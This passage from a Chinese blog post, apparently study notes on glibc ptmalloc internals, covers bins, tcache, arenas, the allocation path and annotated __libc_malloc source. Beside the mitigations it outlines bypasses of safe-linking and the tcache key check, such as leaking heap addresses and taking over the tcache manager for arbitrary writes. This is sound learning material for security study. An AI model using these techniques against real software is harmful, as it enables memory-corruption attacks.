bins</code>，<code>small bins</code>，<code>large bins</code>，<code>unsorted bin</code>。对于 libc2.27 及以上版本还有<code>tcache</code>。</p><p><strong>概述</strong></p><p>对于<code>small bins</code>，<code>large bins</code>，<code>unsorted bin</code>来说，ptmalloc 将它们维护在一个<code>bins</code>数组中。这些<code>bin</code>对应的数据结构在<code>malloc_state</code>中，如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> NBINS 128</span><br><span class="hljs-comment">/* Normal bins packed as described above */</span><br>  mchunkptr bins[NBINS * <span class="hljs-number">2</span> - <span class="hljs-number">2</span>];<br></code></pre></td></tr></table></figure><p><code>bins</code>数组实际上可以看做是以<code>chunk</code>为单位，只不过采用空间复用策略，因为实际用到的只有<code>fd</code>和<code>bk</code>。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* addressing -- note that bin_at(0) does not exist */</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> bin_at(m, i) \</span><br><span class="hljs-meta">  (mbinptr) (((char *) &amp;((m)-&gt;bins[((i) - 1) * 2]))                \</span><br><span class="hljs-meta">             - offsetof (struct malloc_chunk, fd))</span><br></code></pre></td></tr></table></figure><p><img src="/../assets/Pasted%20image%2020241105161925.png"></p><p>由于是双链表结构<code>bins</code>数组每连续两个<code>chunk</code>指针维护一个<code>bin</code>（即<code>fd</code>和<code>bk</code>），其结构如下图所示（64位）。其中 <code>small bins</code>中<code>chunk</code>大小已给出。<code>large bins</code>的每个<code>bin</code>中的<code>chunk</code>大小在一个范围内。</p><p><img src="/../assets/Pasted%20image%2020241105165455.png"><br><code>lareg bin</code>的<code>chunk</code>范围如下：</p><p>大于<code>0x400</code>的<code>chunk</code>就会放到<code>large bin</code>中。</p><p>对于<code>fast bin</code>，在<code>malloc_state</code>又单独定义了一个<code>fastbinsY</code>的结构维护。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">malloc_chunk</span> *<span class="hljs-title">mfastbinptr</span>;</span><br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment">/* Fastbins */</span><br>mfastbinptr fastbinY[ NFASBINS ];<br>*/<br></code></pre></td></tr></table></figure><p>由于<code>fast bin</code>为单链表结构，因此数组中第一个指针就可以维护一个<code>bin</code>。结构如图所示：</p><p><img src="/../assets/Pasted%20image%2020241105171119.png"></p><p><strong>Fast Bin</strong></p><p>为了避免大部分时间花在了合并、分割以及中间检查的过程中影响效率，因此 ptmalloc 中专门设计了<code>fast bin</code>。</p><p><code>fast bin</code>采用单链表形式，结构如下图所示：</p><p><img src="/assets/Pasted%20image%2020241120082430.png"></p><p><code>fast bin</code>有如下性质：</p><ul><li>由于采用单链表结构，<code>fast bin</code>采取 LIFO（后进先出）策略。</li><li>每个<code>fast bin</code>中维护的<code>chunk</code>大小确定，并且<code>fast bin</code>维护的最大的<code>chunk</code>为 128 字节（64位），因此不超过 0x80（chunk大小）的内存释放会进入<code>fast bin</code>。</li><li><code>fast bin</code>范围的<code>chunk</code>下一个相邻<code>chunk</code>的<code>PREV_INUSE</code>始终被置为1。因此它们不会和其它被释放的<code>chunk</code>合并。除非调用<code>malloc_consolidate</code>函数。</li></ul><p>安全检查：</p><ul><li><code>size</code>：在<code>malloc()</code>函数分配<code>fastbin size</code>范围的<code>chunk</code>时，若是对应的<code>fastbin</code>中有空闲<code>chunk</code>，在取出前会检查其<code>size</code>域与对应下标是否一致，不会检查标志位，若否便会触发<code>abort</code>。</li><li><code>double free</code>： 在<code>free()</code>函数中会对<code>fast bin</code>链表的头结点进行检查，若将要被放入<code>fast bin</code>中的<code>chunk</code>与对应下标的链表的头结点为同一<code>chunk</code>，则会触发<code>abort</code>。</li><li>Safe linking 机制（only glibc2.32 and up）：自 glibc 2.32 起引入了 safe-linking 机制，其核心思想是在链表上的<code>chunk</code>中并不直接存放其所连接的下一个<code>chunk</code>的地址，而是存放下一个<code>chunk</code>的地址与【<code>fd</code>指针自身地址右移 12 位】所异或得的值，使得攻击者在得知<code>chunk</code>的地址之前无法直接利用其构造任意地址写。</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> PROTECT_PTR(pos, ptr) \</span><br><span class="hljs-meta">  ((__typeof (ptr)) ((((size_t) pos) &gt;&gt; 12) ^ ((size_t) ptr)))</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> REVEAL_PTR(ptr)  PROTECT_PTR (&amp;ptr, ptr)</span><br></code></pre></td></tr></table></figure><p>需要注意的是<code>fastbin</code>的入口节点存放的仍是未经异或的<code>chunk</code>地址。</p><p>另外第一个加入<code>fast bin</code>的<code>chunk</code>的<code>fd</code>字段可以泄露堆地址（右移 12 位）。</p><p><strong>Small Bin</strong></p><p><code>small bin</code>采用双向链表，结构如下图所示。</p><p><img src="/assets/Pasted%20image%2020241120084426.png"></p><p><code>small bin</code>有如下性质：</p><ul><li><code>small bins</code>中每个<code>bin</code>对应的链表采用 FIFO 的规则。</li><li>每个<code>small bin</code>维护的<code>chunk</code>大小确定，并且<code>small bin</code>维护的最大的<code>chunk</code>为1008字节（64位），即 0x3f0 的<code>chunk</code>大小。</li></ul><p><strong>Large Bin</strong></p><p><code>large bins</code>中一共包括64个<code>bin</code>，每个<code>bin</code>中的<code>chunk</code>的大小不一致，而是处于一定区间范围内。<code>large bin</code>的结构如下：</p><p><img src="/../assets/Pasted%20image%2020241105173944.png"></p><p>关于<code>fd_nextsize</code>和<code>bk_nextsize</code>的机制，这里以<code>fd_nextsize</code>为例：</p><ul><li><code>fd_nextsize</code>和<code>bk_nextsize</code>与<code>bins</code>数组没有连接关系（这就解释了为什么<code>bins</code>上没有体现<code>fd_nextsize</code>和<code>bk_nextsize</code>结构）。</li><li><code>large bin</code>里的<code>chunk</code>在<code>fd</code>指针指向的方向上按照<code>chunk</code>大小降序排序。</li><li>当<code>large bin</code>里有一个<code>chunk</code>时，<code>fd_nextsize</code>和<code>bk_nextsize</code>指向自己（如上面<code>large bin</code>的结构图所示）。</li><li>当<code>large bin</code>里同一个大小的<code>chunk</code>有多个时，只有相同大小<code>chunk</code>中的第一个的<code>fd_nextsize</code>和<code>bk_nextsize</code>指针有效，其余的<code>chunk</code>的<code>fd_nextsize</code>和<code>bk_nextsize</code>设为<code>NULL</code>。</li></ul><p><img src="/../assets/Pasted%20image%2020241105174727.png"></p><ul><li><code>large bin</code>中有多个不同大小的<code>chunk</code>时<code>fd_nextsize</code>连接比它小的第一个<code>chunk</code>，<code>bk_nextsize</code>就是把<code>fd_nextsize</code>反过来连到对应结构上。</li></ul><p><img src="/../assets/Pasted%20image%2020241105174830.png"></p><ul><li><code>large bin</code>最小的一组 <code>chunk</code> 中的第一个 <code>chunk</code> 的 <code>fd_nextsize</code> 连接的是最大的 <code>chunk</code>，最大的 <code>chunk</code> 的 <code>bk_nextsize</code> 相反。</li></ul><p><img src="/../assets/Pasted%20image%2020241105174844.png"></p><p><strong>Unsorted Bin</strong></p><p><code>unsorted bin</code>可以视为空闲<code>chunk</code>回归其所属<code>bin</code>之前的缓冲区。像<code>small bin</code>一样采用双向链表维护。<code>chunk</code>大小乱序。</p><h3 id="Top-chunk"><a href="#Top-chunk" class="headerlink" title="Top chunk"></a>Top chunk</h3><p>程序第一次进行<code>malloc</code>的时候，<code>heap</code>会被分为两块，一块给用户，剩下的那块就是<code>top chunk</code>。其实，所谓的<code>top chunk</code>就是处于当前堆的物理地址最高的<code>chunk</code>。这个<code>chunk</code>不属于任何一个<code>bin</code>，它的作用在于当所有的<code>bin</code>都无法满足用户请求的大小时，如果其大小不小于指定的大小，就进行分配，并将剩下的部分作为新的<code>top chunk</code>。否则，就对<code>heap</code>进行扩展后再进行分配。在<code>main_arena</code>中通过<code>sbrk</code>扩展<code>heap</code>，而在<code>threadarena</code>中通过<code>mmap</code>分配新的heap。</p><p>需要注意的是，<code>top chunk</code>的<code>prev_inuse</code>比特位始终为1，否则其前面的<code>chunk</code>就会被合并到<code>top chunk</code>中。</p><h3 id="last-remainder"><a href="#last-remainder" class="headerlink" title="last remainder"></a>last remainder</h3><p>在用户使用<code>malloc</code>请求分配内存时，ptmalloc2 找到的<code>chunk</code>可能并不和申请的内存大小一致，这时候就将剩余部分称之为<code>last remainder chunk</code>，<code>unsortbin</code>也会存这一块。<code>top chunk</code>分割剩下的部分不会作为<code>last_remainder</code>。</p><p>Mmaped chunk</p><ul><li><p>当需要分配的chunk足够大，而且fast bins和bins都不能满足要求，甚至top chunk本身也不能满足分配需求时，ptmalloc会使用mmap来直接使用内存映射来将页映射到进程空间。</p></li><li><p>这样分配的chunk在被free时将直接解除映射，于是就将内存归还给了操作系统，再次对这样的内存区的引用（UAF）将导致segmentation fault错误。</p></li><li><p>Main_arena有个mmap threshold分配阈值，初始默认为128KB。若请求分配小于阈值，而当前heap空间不够，则用sbrk()增大heap。如果请求超过阈值，或者sbrk()失败了，就用mmap映射一块内存。</p></li><li><p>Mmap分配阈值动态调整机制。</p></li></ul><h2 id="threads-arena"><a href="#threads-arena" class="headerlink" title="threads arena"></a>threads arena</h2><ul><li>每个进程只有一个主分配区(main_arena)，可能存在多个非主分配区(non_main_arena)：</li></ul><p> - x86: <code>2*number of cores + 1</code></p><p> - x64: <code>8*number of cores + 1</code></p><ul><li><p><code>main_arena</code>使用<code>brk</code>和<code>mmap</code>申请虚拟内存</p><ul><li><code>mmap</code>分配的内存一律通过<code>munmap</code>返还</li><li>只有一个heap</li></ul></li><li><p><code>non_main_arena</code>只能用<code>mmap</code></p><ul><li>每次用<code>mmap</code>向系统批发<code>HEAP_MAX_SIZE</code>(32位1MB,64位64MB)，对象请求时再零售</li><li>当前<code>heap</code>不够用，<code>mmap</code>再次申请<code>heap</code>，所以可以包含多个<code>heaps</code></li></ul></li></ul><h3 id="分配策略"><a href="#分配策略" class="headerlink" title="分配策略"></a>分配策略</h3><p>假设有如下情境：一台只含有一个处理器核心的PC机安装有32位操作系统，其上运行了一个多线程应用程序，共含有4个线程——主线程和三个用户线程。显然线程个数大于系统能维护的最大arena个数（2* 核心数 + 1&#x3D; 3），那么此时glibc malloc就需要确保这4个线程能够正确地共享这3个arena，那么它是如何实现的呢？  </p><p>当主线程首次调用malloc的时候，glibc malloc会直接为它分配一个main arena，而不需要任何附加条件。</p><p>当用户线程1和用户线程2首次调用malloc的时候，glibc malloc会分别为每个用户线程创建一个新的thread arena。此时，各个线程与arena是一一对应的。但是，当用户线程3调用malloc的时候，就出现问题了。因为此时glibc malloc能维护的arena个数已经达到上限，无法再为线程3分配新的arena了，那么就需要重复使用已经分配好的3个arena中的一个(main arena, arena 1或者arena 2)。那么该选择哪个arena进行重复利用呢？</p><p>1)首先，glibc malloc循环遍历所有可用的arenas，在遍历的过程中，它会尝试lock该arena。如果成功lock(该arena当前对应的线程并未使用堆内存则表示可lock)，比如将main arena成功lock住，那么就将main arena返回给用户，即表示该arena被线程3共享使用。</p><p>2)而如果没能找到可用的arena，那么就将线程3的malloc操作阻塞，直到有可用的arena为止。</p><p>3)现在，如果线程3再次调用malloc的话，glibc malloc就会先尝试使用最近访问的arena(此时为main arena)。如果此时main arena可用的话，就直接使用，否则就将线程3阻塞，直到main arena再次可用为止。</p><p>这样线程3与主线程就共享main arena了。至于其他更复杂的情况，以此类推。</p><p><img src="/assets/Pasted%20image%2020241208111115.png"></p><p><img src="/assets/Pasted%20image%2020241208111123.png"></p><h2 id="tcache机制"><a href="#tcache机制" class="headerlink" title="tcache机制"></a>tcache机制</h2><p><code>tcache</code> 是 glibc 2.26 (ubuntu 17.10) 之后引入的一种技术，目的是提升堆管理的性能，与<code>fast bin</code>类似。<code>tcache</code> 引入了两个新的结构体，<code>tcache_entry</code> 和 <code>tcache_perthread_struct</code> 。</p><p><code>tcache_entry</code> 定义如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">tcache_entry</span></span><br><span class="hljs-class">&#123;</span><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">tcache_entry</span> *<span class="hljs-title">next</span>;</span><br>&#125; tcache_entry;<br></code></pre></td></tr></table></figure><p><code>tcache_entry</code> 用于链接空闲的<code>chunk</code>结构体，其中的<code>next</code>指针指向下一个大小相同的<code>chunk</code>。需要注意的是这里的<code>next</code>指向<code>chunk</code>的<code>user data</code>，而<code>fast bin</code>的<code>fd</code>指向<code>chunk</code>开头的地址。而且，<code>tcache_entry</code> 会复用空闲 <code>chunk</code> 的<code>user data</code>部分。</p><p><code>tcache_perthread_struct</code> 定义如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">tcache_perthread_struct</span></span><br><span class="hljs-class">&#123;</span><br>  <span class="hljs-type">char</span> counts[TCACHE_MAX_BINS];<br>  tcache_entry *entries[TCACHE_MAX_BINS];<br>&#125; tcache_perthread_struct;<br><br><span class="hljs-meta"># <span class="hljs-keyword">define</span> TCACHE_MAX_BINS                64</span><br><br><span class="hljs-type">static</span> __thread tcache_perthread_struct *tcache = <span class="hljs-literal">NULL</span>;<br></code></pre></td></tr></table></figure><p>对应结构如下</p><p><img src="/../assets/Pasted%20image%2020241105180409.png"><br>每个<code>thread</code>都会维护一个 <code>tcache_perthread_struct</code> ，它是整个 <code>tcache</code> 的管理结构，一共有 <code>TCACHE_MAX_BINS</code> 个计数器和 <code>TCACHE_MAX_BINS</code> 项 <code>tcache_entry</code>。这个结构在 <code>tcache_init</code> 函数中被初始化在堆上，大小为 0x250（高版本为 0x290）。其中数据部分前 0x40 为 <code>counts</code> ，剩下的为 <code>entries</code> 结构。如果能控制这个堆块就可以控制整个 <code>tcache</code> 。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">void</span><br><span class="hljs-title function_">tcache_init</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>  mstate ar_ptr;<br>  <span class="hljs-type">void</span> *victim = <span class="hljs-number">0</span>;<br>  <span class="hljs-type">const</span> <span class="hljs-type">size_t</span> bytes = <span class="hljs-keyword">sizeof</span> (tcache_perthread_struct);<br>  <br>  <span class="hljs-keyword">if</span> (tcache_shutting_down)<br>    <span class="hljs-keyword">return</span>;<br><br>  arena_get (ar_ptr, bytes);<br>  victim = _int_malloc (ar_ptr, bytes);<br>  <span class="hljs-keyword">if</span> (!victim &amp;&amp; ar_ptr != <span class="hljs-literal">NULL</span>)<br>    &#123;<br>      ar_ptr = arena_get_retry (ar_ptr, bytes);<br>      victim = _int_malloc (ar_ptr, bytes);<br>    &#125;<br>    <br>  <span class="hljs-keyword">if</span> (ar_ptr != <span class="hljs-literal">NULL</span>)<br>    __libc_lock_unlock (ar_ptr-&gt;mutex);<br><br>  <span class="hljs-comment">/* In a low memory situation, we may not be able to allocate memory</span><br><span class="hljs-comment">     - in which case, we just keep trying later.  However, we</span><br><span class="hljs-comment">     typically do this very early, so either there is sufficient</span><br><span class="hljs-comment">     memory, or there isn&#x27;t enough memory to do non-trivial</span><br><span class="hljs-comment">     allocations anyway.  */</span><br><br>  <span class="hljs-keyword">if</span> (victim)<br>    &#123;<br>      tcache = (tcache_perthread_struct *) victim;<br>      <span class="hljs-built_in">memset</span> (tcache, <span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span> (tcache_perthread_struct));<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><code>tcache_perthread_struct</code> 中的 <code>tcache_entry</code> 用单向链表的方式链接了相同大小的处于空闲状态（<code>free</code> 后）的 <code>chunk</code>，这一点上和 fast bin 很像。</p><p>另外与<code>fast bin</code>相同的是释放进入 <code>tcache</code> 的 <code>chunk</code> 的下一个相邻 <code>chunk</code> 的 <code>PREV_INUSE</code> 位不清零。</p><p><code>counts</code> 记录了 <code>tcache_entry</code> 链上空闲 <code>chunk</code> 的数目，每条链上最多可以有 7 个 <code>chunk</code> 。注意指针指向的位置是 <code>fd</code> 指针，这一点与<code>fast bin</code>不同。<br>结构如下：</p><p><img src="/../assets/Pasted%20image%2020241105210106.png"></p><p>stash 机制：</p><p>当申请的大小在 <code>tcache</code> 范围的 <code>chunk</code> 在 <code>tcache</code> 中没有，此时 ptmalloc 会在其他 <code>bin</code> 里面找，如果找到了会将该 <code>chunk</code> 放到 <code>tcache</code> 中，直到 <code>tcache</code> 填满，最后直接返回找到的 <code>chunk</code> 或是从 <code>tcache</code> 中取出并返回。</p><p>安全检查：</p><ul><li>tcache key（only libc2.29 and up）：自 glibc2.29 版本起 <code>tcache</code> 新增了一个 key 字段，该字段位于 <code>chunk</code> 的 bk 字段，值为 <code>tcache</code> 结构体的地址，若 <code>free()</code> 检测到 <code>chunk-&gt;bk == tcache</code> 则会遍历 <code>tcache</code> 查找对应链表中是否有该 <code>chunk</code><br>  最新版本的一些老 glibc （如新版2.27等）也引入了该防护机制</li><li>Safe linking 机制（only glibc2.32 and up）：与<code>fast bin</code>类似。<br>  绕过方法：<ul><li>在 <code>tcache</code> 的一个 <code>entry</code> 中放入第一个 <code>chunk</code> 时，其同样会对该 <code>entry</code> 中的 “<code>chunk</code>” （NULL）进行异或运算后写入到将放入 <code>tcache</code> 中的 <code>chunk</code> 的 <code>fd</code> 字段，若是我们能够打印该 free chunk 的 <code>fd</code> 字段，便能够直接获得未经异或运算的堆上相关地址（右移 12 位）</li><li>在 <code>tcache-&gt;entry</code> 中存放的仍是未经加密过的地址，若是我们能够控制 <code>tcache</code> 管理器则仍可以在不知道堆相关地址时进行任意地址写。</li></ul></li></ul><h2 id="分配过程"><a href="#分配过程" class="headerlink" title="分配过程"></a>分配过程</h2><ul><li>我们调用<code>malloc</code>函数分配一块内存给一个指针时，实际上我们是调用了<code>_libc_malloc</code>函数。</li><li>首先会在<code>_libc_malloc</code>函数中判断<code>__malloc_hook</code>函数指针是否为空，如果不为空则调用<code>__malloc_hook</code>函数指针（glibc2.34已删除）。</li><li>如果<code>glibc</code>存在<code>tcache</code>且有相应大小的<code>chunk</code>则将其从<code>tcache</code>中取出并返回结果。</li><li>如果没有<code>tcache</code>或其中不存在相应的<code>chunk</code>，则调用<code>_int_malloc</code>函数申请内存。<ul><li>首先把申请的内存的字节数转化为<code>chunk</code>的大小。</li><li>如果<code>arena</code>未初始化，则调用<code>sysmalloc</code>向系统申请内存，然后将获取的<code>chunk</code>返回。</li><li>如果申请的<code>chunk</code>大小不超过<code>fast bin</code>的最大值，则尝试从对应的<code>fast bin</code>的头部获取<code>chunk</code>。在获取到<code>chunk</code>后，如果对应的<code>fast bin</code>还有<code>chunk</code>并且大小在<code>tcache</code>范围就将它们依次从头结点取出放到<code>tcache</code>中，直到把<code>tcache</code>填满。最后将申请到的<code>chunk</code>返回。</li><li>如果申请的<code>chunk</code>在<code>large bin</code>大小范围则调用<code>malloc_consolidate</code>函数将<code>fast bin</code>中的<code>chunk</code>合并后放入 <code>unsorted bin</code>。</li><li>循环进行如下操作：<ul><li>循环取<code>unsorted bin</code>最后一个<code>chunk</code>。<ul><li>如果用户的请求为<code>small bin chunk</code>，那么我们首先考虑<code>last remainder</code>，如果当前<code>chunk</code>是<code>last remainder</code>，且<code>last remainder</code>是<code>unsorted bin</code>中的唯一一个<code>chunk</code>，并且<code>last remainder</code>的大小分割后还可以作为一个<code>chunk</code>，则从<code>last remainder</code>中切下一块内存返回。</li><li>如果<code>chunk</code>的大小恰好等于申请的<code>chunk</code>大小，则如果该内存大小在 tcache 范围且 tcache 没有满，则先将其放入<code>tcache</code>，之后会考虑从<code>tcache</code>中找<code>chunk</code>。否则直接将找到的<code>chunk</code>返回。</li><li>根据<code>chunk</code>的大小将其放入<code>small bin</code>或<code>large bin</code>中。对于<code>small bin</code>直接从链表头部加入；对于 <code>large bin</code>，首先特判加入链表尾部的情况，如果不在链表尾部则从头部遍历找位置，如果<code>large bin</code>中有与加入的<code>chunk</code>大小相同的<code>chunk</code>，则加入到第一个相等<code>chunk</code>后面，否则加到合适位置后还需要更新 nextsize 指针。</li><li>尝试从<code>tcache</code>找<code>chunk</code>。</li><li>如果循环超过 10000 次就跳出循环。</li></ul></li><li>尝试从<code>tcache</code>找<code>chunk</code>。</li><li>如果申请<code>chunk</code>大小不在<code>small bin</code>范围，则从后往前遍历对应<code>large bin</code>，找到第一个不小于申请 chunk 大小的 chunk。为了 unlink 时避免修改 nextsize 的操作，如果存在多个合适的 chunk 则选择第二个 chunk。如果选取的 chunk 比申请的 chunk 大不少于 MINSIZE，则需要将多出来的部分切出来作为 <code>remainder</code>，并将其加入<code>unsorted bin</code>头部。然后将获取的<code>chunk</code>返回。</li><li>找一个<code>chunk</code>范围比申请<code>chunk</code>大的非空<code>bin</code>里面找最后一个<code>chunk</code>，这个过程用 binmap 优化，同时也可以更新 <code>binmap</code> 的状态。这个<code>chunk</code>上切下所需的<code>chunk</code>，剩余部分放入<code>unsorted bin</code>头部。然后将获取的<code>chunk</code>返回。</li><li>如果<code>top chunk</code>切下所需<code>chunk</code>后剩余部分还是不小于 <code>MINSIZE</code> 则从<code>top chunk</code>上切下所需 <code>chunk</code> 返回。</li><li>如果<code>fast bins</code>还有<code>chunk</code>则调用<code>malloc_consolidate</code>合并<code>fast bin</code>中的<code>chunk</code>并放入<code>unsorted bin</code>中，然后继续循环。</li><li>如果<code>fast bins</code>还有<code>chunk</code>则调用<code>malloc_consolidate</code>合并<code>fast bin</code>中的<code>chunk</code>并放入 <code>unsorted bin</code>中，然后继续循环。</li><li>最后<code>sysmalloc</code>系统调用向操作系统申请内存分配<code>chunk</code>。<ul><li>如果<code>arena</code>没有初始化或者申请的内存大于<code>mp_.mmap_threshold</code>，并且<code>mmap</code>的次数小于最大值，则使用<code>mmap</code>申请内存。然后检查一下是否16字节对齐然后更新<code>mmap</code>次数和<code>mmap</code>申请过的最大内存大小后就将<code>chunk</code>返回。</li><li>如果<code>arena</code>没有初始化就返回0。</li><li>对之前的<code>top chunk</code>进行检查，如果是 dummy top的话，因为是用<code>unsorted bin</code>表示的，因此 top chunk 的大小需要是0。否则堆的大小应该不小于 MINSIZE ，并且前一个堆块一个处于使用中，并且堆的结束地址应该是页对齐的，由于页对齐的大小默认是 0x1000，所以低 12 个比特需要为0.初次之外，<code>top chunk</code>大小必须比申请<code>chunk</code>大小加上 MINSIZE 要小。</li><li>如果<code>arena</code>不是<code>main_arena</code><ul><li>尝试将<code>top chunk</code>所在的<code>heap</code>扩展大小，如果成功则更新<code>arena</code>记录的内存总大小 <code>system_mem</code>和<code>top chunk</code>大小。</li><li>尝试申请一个新的<code>heap</code>。设置新的<code>heap</code>以及<code>arena</code>的参数并且将原来的<code>top chunk</code>先从尾部切下 2 个0x10大小的<code>chunk</code>，剩余部分如果不小于 MINSIZE 则将其释放掉。</li><li>否则，如果前面没有执行到<code>mmap</code>申请<code>chunk</code>的分支就尝试执行。</li></ul></li><li>如果<code>arena</code>是 <code>main arena</code><ul><li>计算需要获取的内存大小。需要获取的内存大小等于申请的<code>chunk</code>大小加上0x20000和MINSIZE。如果堆空间连续，则可以再减去原来内存的大小。然后将需要获取的内存大小与页对齐。</li><li><code>sbrk</code>扩展内存如果成功则会尝试调用一个 hook 函数，否则<code>mmap</code>申请内存，然后<code>brk</code>移到申请的内存处并设置堆不连续参数。</li><li>如果成功获取到内存，则更新<code>arena</code>记录的内存总大小<code>system_mem</code>和<code>sbrk_base</code>。之后对一系列的情况进行处理，在这期间，之前的<code>top chunk</code>会被从尾部切下两个 0x10 大小的<code>chunk</code>，剩余部分如果不小于<code>MINSIZE</code>则将其释放掉。</li></ul></li><li>最后从新获取的<code>top chunk</code>切下所需的<code>chunk</code>并返回。</li></ul></li></ul></li></ul></li></ul><h2 id="malloc源码分析"><a href="#malloc源码分析" class="headerlink" title="malloc源码分析"></a>malloc源码分析</h2><p>如果前一个 chunk 处于使用状态，那么不需要去通过链表串起来，所以当前 chunk 也就不需要 prev_size，当申请的内存大小对 2 * size_t 取余之后比 size_t 小于等于的话就可以用它的下一个 chunk 的 prev_size</p><p>还是 64 位下，如果大小是 0x49 的话取余之后还差 0x5，那就没法用了，只能多申请一块，最后加上 chunk header 用了 0x60</p><p>内存对齐</p><table><thead><tr><th>机器类型</th><th>64位</th><th>32位</th></tr></thead><tbody><tr><td>对齐位数</td><td>16</td><td>8</td></tr><tr><td>size_t</td><td>8</td><td>4</td></tr></tbody></table><h3 id="libc-malloc"><a href="#libc-malloc" class="headerlink" title="__libc_malloc"></a><code>__libc_malloc</code></h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> *<br>__libc_malloc (<span class="hljs-type">size_t</span> bytes)<br>&#123;<br><span class="hljs-comment">//定义了一个指向arena的指针，用于内存分配</span><br>  mstate ar_ptr;<br><br><span class="hljs-comment">//用于存储最终返回的分配内存地址</span><br>  <span class="hljs-type">void</span> *victim;<br><br><span class="hljs-comment">//检查自定义malloc钩子</span><br>  <span class="hljs-type">void</span> *(*hook) (<span class="hljs-type">size_t</span>, <span class="hljs-type">const</span> <span class="hljs-type">void</span> *)<br>    = atomic_forced_read (__malloc_hook);<br>  <span class="hljs-keyword">if</span> (__builtin_expect (hook != <span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>))<br>    <span class="hljs-keyword">return</span> (*hook)(bytes, RETURN_ADDRESS (<span class="hljs-number">0</span>));<br><br><span class="hljs-comment">//获取本线程对应的arena，即malloc_state结构体</span><br>  arena_get (ar_ptr, bytes);<br><br><span class="hljs-comment">//调用_int_malloc申请内存</span><br><span class="hljs-comment">//参数ar_ptr指向arena，参数bytes为申请的字节数</span><br>  victim = _int_malloc (ar_ptr, bytes);<br><br><span class="hljs-comment">//若在当前arena中分配失败，且ar_ptr非空，会调用arena_get_retry获取其他arena进行重试。</span><br>  <span class="hljs-keyword">if</span> (!victim &amp;&amp; ar_ptr != <span class="hljs-literal">NULL</span>)<br>    &#123;<br>      LIBC_PROBE (memory_malloc_retry, <span class="hljs-number">1</span>, bytes);<br>      ar_ptr = arena_get_retry (ar_ptr, bytes);<br>      victim = _int_malloc (ar_ptr, bytes);<br>    &#125;<br><br><span class="hljs-comment">//在完成分配或失败后，释放该arena的互斥锁，确保其它线程可以访问此arena</span><br>  <span class="hljs-keyword">if</span> (ar_ptr != <span class="hljs-literal">NULL</span>)<br>    (<span class="hljs-type">void</span>) mutex_unlock (&amp;ar_ptr-&gt;mutex);<br><br><span class="hljs-comment">//通过条件验证分配，不满足则直接崩溃</span><br><span class="hljs-comment">//1.是否没有申请成功内存返回是空</span><br><span class="hljs-comment">//2.该chunk是否是通过mmap分配的内存块</span><br><span class="hljs-comment">//3.判断arean指针和mainarena是否匹配</span><br>  assert (!victim || chunk_is_mmapped (mem2chunk (victim)) ||<br>          ar_ptr == arena_for_chunk (mem2chunk 